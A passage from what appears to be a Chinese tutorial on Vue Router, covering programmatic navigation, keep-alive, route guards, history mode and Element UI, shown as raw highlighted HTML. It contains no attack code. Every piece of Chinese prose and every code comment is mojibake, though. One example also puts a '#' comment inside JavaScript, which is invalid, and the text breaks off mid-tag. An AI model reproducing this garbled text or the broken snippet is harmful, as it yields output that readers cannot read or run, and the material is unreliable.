class="hljs-attr">title</span>:xxx<br>&#125;<br>&#125;)<br><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">replace</span>(&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">params</span>:&#123;<br><span class="hljs-attr">id</span>:xxx,<br><span class="hljs-attr">title</span>:xxx<br>&#125;<br>&#125;)<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">forward</span>() <span class="hljs-comment">//å‰è¿›</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">back</span>() <span class="hljs-comment">//åé€€</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">go</span>() <span class="hljs-comment">//å¯å‰è¿›ä¹Ÿå¯åé€€</span><br></code></pre></td></tr></table></figure><h2 id="4-10-ç¼“å­˜è·¯ç”±ç»„ä»¶"><a href="#4-10-ç¼“å­˜è·¯ç”±ç»„ä»¶" class="headerlink" title="4.10 ç¼“å­˜è·¯ç”±ç»„ä»¶"></a>4.10 ç¼“å­˜è·¯ç”±ç»„ä»¶</h2><pre><code class="hljs">1. ä½œç”¨ï¼šè®©ä¸å±•ç¤ºçš„è·¯ç”±ç»„ä»¶ä¿æŒæŒ‚è½½ï¼Œä¸è¢«é”€æ¯ã€‚2. å…·ä½“ç¼–ç ï¼š</code></pre><p>è¿™ä¸ª include æŒ‡çš„æ˜¯ç»„ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vue">// ç¼“å­˜ä¸€ä¸ªè·¯ç”±ç»„ä»¶<br>&lt;keep-alive include=&quot;News&quot;&gt; // includeä¸­å†™æƒ³è¦ç¼“å­˜çš„ç»„ä»¶åï¼Œä¸å†™è¡¨ç¤ºå…¨éƒ¨ç¼“å­˜<br>    &lt;router-view&gt;&lt;/router-view&gt;<br>&lt;/keep-alive&gt;<br><br>// ç¼“å­˜å¤šä¸ªè·¯ç”±ç»„ä»¶<br>&lt;keep-alive :include=&quot;[&#x27;News&#x27;,&#x27;Message&#x27;]&quot;&gt; <br>    &lt;router-view&gt;&lt;/router-view&gt;<br>&lt;/keep-alive&gt;<br></code></pre></td></tr></table></figure><h2 id="4-11-ä¸¤ä¸ªæ–°çš„ç”Ÿå‘½å‘¨æœŸé’©å­"><a href="#4-11-ä¸¤ä¸ªæ–°çš„ç”Ÿå‘½å‘¨æœŸé’©å­" class="headerlink" title="4.11 ä¸¤ä¸ªæ–°çš„ç”Ÿå‘½å‘¨æœŸé’©å­"></a>4.11 ä¸¤ä¸ªæ–°çš„ç”Ÿå‘½å‘¨æœŸé’©å­</h2><p>ä½œç”¨ï¼šè·¯ç”±ç»„ä»¶æ‰€ç‹¬æœ‰çš„ä¸¤ä¸ªé’©å­ï¼Œç”¨äºæ•è·è·¯ç”±ç»„ä»¶çš„æ¿€æ´»çŠ¶æ€ã€‚<br>å…·ä½“åå­—ï¼š</p><ul><li><code>activated</code>è·¯ç”±ç»„ä»¶è¢«æ¿€æ´»æ—¶è§¦å‘ã€‚</li><li><code>deactivated</code>è·¯ç”±ç»„ä»¶å¤±æ´»æ—¶è§¦å‘ã€‚</li></ul><blockquote><p>è¿™ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­éœ€è¦é…åˆå‰é¢çš„ç¼“å­˜è·¯ç”±ç»„ä»¶ä½¿ç”¨ï¼ˆæ²¡æœ‰ç¼“å­˜è·¯ç”±ç»„ä»¶ä¸èµ·æ•ˆæœï¼‰</p></blockquote><p>src&#x2F;pages&#x2F;News.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;ul&gt;<br>        &lt;li :style=&quot;&#123;opacity&#125;&quot;&gt;æ¬¢è¿å­¦ä¹ vue&lt;/li&gt;<br>        &lt;li&gt;news001 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news002 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news003 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>    &lt;/ul&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    export default &#123;<br>        name:&#x27;News&#x27;,<br>        data()&#123;<br>            return&#123;<br>                opacity:1<br>            &#125;<br>        &#125;,<br>        activated()&#123;<br>            console.log(&#x27;Newsç»„ä»¶è¢«æ¿€æ´»äº†&#x27;)<br>            this.timer = setInterval(() =&gt; &#123;<br>                this.opacity -= 0.01<br>                if(this.opacity &lt;= 0) this.opacity = 1<br>            &#125;,16)<br>        &#125;,<br>        deactivated()&#123;<br>            console.log(&#x27;Newsç»„ä»¶å¤±æ´»äº†&#x27;)<br>            clearInterval(this.timer)<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="4-12-è·¯ç”±å®ˆå«"><a href="#4-12-è·¯ç”±å®ˆå«" class="headerlink" title="4.12 è·¯ç”±å®ˆå«"></a>4.12 è·¯ç”±å®ˆå«</h2><ol><li><p>ä½œç”¨ï¼šå¯¹è·¯ç”±è¿›è¡Œæƒé™æ§åˆ¶</p></li><li><p>åˆ†ç±»ï¼šå…¨å±€å®ˆå«ã€ç‹¬äº«å®ˆå«ã€ç»„ä»¶å†…å®ˆå«</p><ol start="3"><li><p>å…¨å±€å®ˆå«:</p><p>metaè·¯ç”±æºä¿¡æ¯</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// å…¨å±€å‰ç½®å®ˆå«ï¼šåˆå§‹åŒ–æ—¶ã€æ¯æ¬¡è·¯ç”±åˆ‡æ¢å‰æ‰§è¡Œ</span><br>router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to,<span class="hljs-keyword">from</span>,next</span>) =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeEach&#x27;</span>,to,<span class="hljs-keyword">from</span>)<br><span class="hljs-keyword">if</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">isAuth</span>)&#123; <span class="hljs-comment">// åˆ¤æ–­å½“å‰è·¯ç”±æ˜¯å¦éœ€è¦è¿›è¡Œæƒé™æ§åˆ¶</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;school&#x27;</span>) === <span class="hljs-string">&#x27;atguigu&#x27;</span>)&#123; <span class="hljs-comment">// æƒé™æ§åˆ¶çš„å…·ä½“è§„åˆ™</span><br><span class="hljs-title function_">next</span>()<span class="hljs-comment">// æ”¾è¡Œ</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;æš‚æ— æƒé™æŸ¥çœ‹&#x27;</span>)<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_">next</span>()<span class="hljs-comment">// æ”¾è¡Œ</span><br>&#125;<br>&#125;)<br><br><span class="hljs-comment">// å…¨å±€åç½®å®ˆå«ï¼šåˆå§‹åŒ–æ—¶ã€æ¯æ¬¡è·¯ç”±åˆ‡æ¢åæ‰§è¡Œ</span><br>router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to,<span class="hljs-keyword">from</span></span>) =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;afterEach&#x27;</span>,to,<span class="hljs-keyword">from</span>)<br><span class="hljs-keyword">if</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span>)&#123; <br><span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> <span class="hljs-comment">//ä¿®æ”¹ç½‘é¡µçš„title</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;vue_test&#x27;</span><br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// è¿™ä¸ªæ–‡ä»¶ä¸“é—¨ç”¨äºåˆ›å»ºæ•´ä¸ªåº”ç”¨çš„è·¯ç”±å™¨</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">VueRouter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-comment">// å¼•å…¥ç»„ä»¶</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/About.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Home.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Message</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Message.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">News</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/News.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Detail</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Detail.vue&#x27;</span><br><span class="hljs-comment">// åˆ›å»ºå¹¶æš´éœ²ä¸€ä¸ªè·¯ç”±å™¨</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>(&#123;<br>    <span class="hljs-attr">routes</span>: [<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/home&#x27;</span>,<br>            <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>,<br>            <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;ä¸»é¡µ&#x27;</span>&#125;,<br>            <span class="hljs-attr">children</span>: [<br>                &#123;<br>                    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;news&#x27;</span>,<br>                    <span class="hljs-attr">component</span>: <span class="hljs-title class_">News</span>,<br>                    <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">isAuth</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;æ–°é—»&#x27;</span>&#125;<br>                &#125;,<br>                &#123;<br>                    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;message&#x27;</span>,<br>                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;mess&#x27;</span>,<br>                    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Message</span>,<br>                    <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">isAuth</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;æ¶ˆæ¯&#x27;</span>&#125;,<br>                    <span class="hljs-attr">children</span>: [<br>                        &#123;<br>                            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;detail/:id/:title&#x27;</span>,<br>                            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br>                            <span class="hljs-attr">component</span>: <span class="hljs-title class_">Detail</span>,<br>                            <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">isAuth</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;è¯¦æƒ…&#x27;</span>&#125;,<br>                            <span class="hljs-title function_">props</span>(<span class="hljs-params">$route</span>) &#123;<br>                                <span class="hljs-keyword">return</span> &#123;<br>                                    <span class="hljs-attr">id</span>: $route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>,<br>                                    <span class="hljs-attr">title</span>:$route.<span class="hljs-property">query</span>.<span class="hljs-property">title</span>,<br><span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,<br><span class="hljs-attr">b</span>: <span class="hljs-string">&#x27;hello&#x27;</span><br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    ]<br>                &#125;<br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/about&#x27;</span>,<br>            <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span>,<br>            <span class="hljs-attr">meta</span>:&#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;å…³äº&#x27;</span> &#125;<br>        &#125;<br>    ]<br>&#125;)<br><br><span class="hljs-comment">// å…¨å±€å‰ç½®è·¯ç”±å®ˆå«â€”â€”â€”â€”åˆå§‹åŒ–çš„æ—¶å€™è¢«è°ƒç”¨ã€æ¯æ¬¡è·¯ç”±åˆ‡æ¢ä¹‹å‰è¢«è°ƒç”¨</span><br>router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;å‰ç½®è·¯ç”±å®ˆå«&#x27;</span>, to, <span class="hljs-keyword">from</span>);<br>    <span class="hljs-keyword">if</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">isAuth</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;school&#x27;</span>) === <span class="hljs-string">&#x27;zhejiang&#x27;</span>) &#123;<br>            <span class="hljs-comment">// æ”¾è¡Œ</span><br>            <span class="hljs-title function_">next</span>()<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;å­¦æ ¡åä¸å¯¹ï¼Œæ— æƒæŸ¥çœ‹&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<br>&#125;)<br><br><span class="hljs-comment">// å…¨å±€åç½®è·¯ç”±å®ˆå«â€”â€”â€”â€”åˆå§‹åŒ–çš„æ—¶å€™è¢«è°ƒç”¨ã€æ¯æ¬¡è·¯ç”±åˆ‡æ¢ä¹‹åè¢«è°ƒç”¨</span><br>router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;åç½®è·¯ç”±å®ˆå«&#x27;</span>, to, <span class="hljs-keyword">from</span>)<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> || <span class="hljs-string">&#x27;æˆ‘çš„ç³»ç»Ÿ&#x27;</span><br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router<br><br></code></pre></td></tr></table></figure><ol start="2"><li><p>ç‹¬äº«å®ˆå«:</p><blockquote><p>å°±æ˜¯åœ¨ routes å­è·¯ç”±å†…å†™å®ˆå«</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">beforeEnter</span>(<span class="hljs-params">to,<span class="hljs-keyword">from</span>,next</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeEnter&#x27;</span>,to,<span class="hljs-keyword">from</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;school&#x27;</span>) === <span class="hljs-string">&#x27;atguigu&#x27;</span>)&#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;æš‚æ— æƒé™æŸ¥çœ‹&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124163115876.png" alt="image-20221124163115876"></p></li></ol></li></ol><p>â€‹        </p><ol start="3"><li><p>ç»„ä»¶å†…å®ˆå«</p><blockquote><p>åœ¨å…·ä½“ç»„ä»¶å†…å†™å®ˆå«</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//è¿›å…¥å®ˆå«ï¼šé€šè¿‡è·¯ç”±è§„åˆ™ï¼Œè¿›å…¥è¯¥ç»„ä»¶æ—¶è¢«è°ƒç”¨</span><br>beforeRouteEnter (to, <span class="hljs-keyword">from</span>, next) &#123;<br>&#125;,<br><span class="hljs-comment">//ç¦»å¼€å®ˆå«ï¼šé€šè¿‡è·¯ç”±è§„åˆ™ï¼Œç¦»å¼€è¯¥ç»„ä»¶æ—¶è¢«è°ƒç”¨</span><br>beforeRouteLeave (to, <span class="hljs-keyword">from</span>, next) &#123;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;ul&gt;<br>        &lt;li :style=&quot;&#123;opacity&#125;&quot;&gt;æ¬¢è¿å­¦ä¹ vue&lt;/li&gt;<br>        &lt;li&gt;news001 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news002 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news003 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>    &lt;/ul&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    export default &#123;<br>        name: &#x27;News&#x27;,<br>        data() &#123;<br>            return &#123;<br>                opacity: 1<br>            &#125;<br>        &#125;,<br>        activated() &#123;<br>            console.log(&#x27;Newsç»„ä»¶è¢«æ¿€æ´»äº†&#x27;)<br>            this.timer = setInterval(() =&gt; &#123;<br>                this.opacity -= 0.01<br>                if (this.opacity &lt;= 0) this.opacity = 1<br>            &#125;, 16)<br>        &#125;,<br>        deactivated() &#123;<br>            console.log(&#x27;Newsç»„ä»¶å¤±æ´»äº†&#x27;)<br>            clearInterval(this.timer)<br>        &#125;, // é€šè¿‡è·¯ç”±è§„åˆ™ï¼Œç¦»å¼€è¯¥ç»„ä»¶æ—¶è¢«è°ƒç”¨<br>        beforeRouteEnter(to, from, next) &#123;<br>            console.log(&#x27;beforeRouteEnter&#x27;, to, from)<br>            if (localStorage.getItem(&#x27;school&#x27;) === &#x27;jialidundaxue&#x27;) &#123;<br>                next()<br>            &#125; else &#123;<br>                alert(&#x27;å­¦æ ¡åä¸å¯¹ï¼Œæ— æƒé™æŸ¥çœ‹ï¼&#x27;)<br>            &#125;<br>        &#125;,<br>        // é€šè¿‡è·¯ç”±è§„åˆ™ï¼Œç¦»å¼€è¯¥ç»„ä»¶æ—¶è¢«è°ƒç”¨<br>        beforeRouteLeave(to, from, next) &#123;<br>            console.log(&#x27;beforeRouteLeave&#x27;, to, from)<br>            next()<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li></ol><p>åŒä¸€ç»„ä»¶é…ç½®å…¨éƒ¨å®ˆå«çš„æ‰§è¡Œé¡ºåº</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221119205337798.png" alt="image-20221119205337798"></p><h2 id="4-13-è·¯ç”±å™¨çš„ä¸¤ç§å·¥ä½œæ¨¡å¼"><a href="#4-13-è·¯ç”±å™¨çš„ä¸¤ç§å·¥ä½œæ¨¡å¼" class="headerlink" title="4.13 è·¯ç”±å™¨çš„ä¸¤ç§å·¥ä½œæ¨¡å¼"></a>4.13 è·¯ç”±å™¨çš„ä¸¤ç§å·¥ä½œæ¨¡å¼</h2><ol><li><p>å¯¹äºä¸€ä¸ªurlæ¥è¯´ï¼Œä»€ä¹ˆæ˜¯hashå€¼?</p><p>#åŠå…¶åé¢çš„å†…å®¹å°±æ˜¯hashå€¼ã€‚</p></li><li><p>hashå€¼ä¸ä¼šåŒ…å«åœ¨ HTTP è¯·æ±‚ä¸­ï¼Œå³ï¼šhashå€¼ä¸ä¼šå¸¦ç»™æœåŠ¡å™¨ã€‚</p></li><li><p>hashæ¨¡å¼ï¼š</p><ol><li>åœ°å€ä¸­æ°¸è¿œå¸¦ç€#å·ï¼Œä¸ç¾è§‚ ã€‚</li><li>è‹¥ä»¥åå°†åœ°å€é€šè¿‡ç¬¬ä¸‰æ–¹æ‰‹æœºappåˆ†äº«ï¼Œè‹¥appæ ¡éªŒä¸¥æ ¼ï¼Œåˆ™åœ°å€ä¼šè¢«æ ‡è®°ä¸ºä¸åˆæ³•ã€‚</li><li>å…¼å®¹æ€§è¾ƒå¥½ã€‚</li></ol></li><li><p>historyæ¨¡å¼ï¼š</p><ol><li><p>åœ°å€å¹²å‡€ï¼Œç¾è§‚ ã€‚</p></li><li><p>å…¼å®¹æ€§å’Œhashæ¨¡å¼ç›¸æ¯”ç•¥å·®ã€‚</p></li><li><p>åº”ç”¨éƒ¨ç½²ä¸Šçº¿æ—¶éœ€è¦åç«¯äººå‘˜æ”¯æŒï¼Œè§£å†³åˆ·æ–°é¡µé¢æœåŠ¡ç«¯404çš„é—®é¢˜ã€‚</p><p>åˆ©ç”¨<code>node</code> <code>express</code>ç®€å•æ­å»ºä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨<code>connect-history-api-fallback</code>è§£å†³</p><p>å•¥æ­£åˆ™è·¯å¾„åŒ¹é…</p></li></ol></li></ol><p></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> router =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>(&#123;<br><span class="hljs-attr">mode</span>:<span class="hljs-string">&#x27;history&#x27;</span>, #é»˜è®¤<br><span class="hljs-attr">routes</span>:[...]<br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router<br></code></pre></td></tr></table></figure><pre><code class="hljs">1. </code></pre><h1 id="5-Vue-UI-ç»„ä»¶åº“"><a href="#5-Vue-UI-ç»„ä»¶åº“" class="headerlink" title="5.Vue UI ç»„ä»¶åº“"></a>5.Vue UI ç»„ä»¶åº“</h1><h2 id="5-1-å¸¸ç”¨UIç»„ä»¶åº“"><a href="#5-1-å¸¸ç”¨UIç»„ä»¶åº“" class="headerlink" title="5.1 å¸¸ç”¨UIç»„ä»¶åº“"></a>5.1 å¸¸ç”¨UI<strong>ç»„ä»¶åº“</strong></h2><ol><li><p>ç§»åŠ¨ç«¯å¸¸ç”¨UIç»„ä»¶åº“</p><p><a href="https://youzan.github.io/vant">Vant</a></p><p><a href="https://didi.github.io/cube-ui">Cube UI</a></p><p><a href="http://mint-ui.github.io/">Mint UI</a></p><p><a href="https://nutui.jd.com/#/">https://nutui.jd.com/#/</a></p></li><li><p>PCç«¯å¸¸ç”¨UIç»„ä»¶åº“</p><p><a href="https://element.eleme.cn/">Element UI</a></p><p><a href="https://www.iviewui.com/">IView UI</a></p></li></ol><h2 id="5-2-element-uiåŸºæœ¬ä½¿ç”¨"><a href="#5-2-element-uiåŸºæœ¬ä½¿ç”¨" class="headerlink" title="5.2. element-uiåŸºæœ¬ä½¿ç”¨"></a>5.2. element-uiåŸºæœ¬ä½¿ç”¨</h2><ol><li><p>lement-uiï¼šnpm i element-ui -S </p></li><li><p>src&#x2F;main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ElementUI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span>;<span class="hljs-comment">// å¼•å…¥ElementUIç»„ä»¶åº“</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;<span class="hljs-comment">// å¼•å…¥ElementUIå…¨éƒ¨æ ·å¼</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span 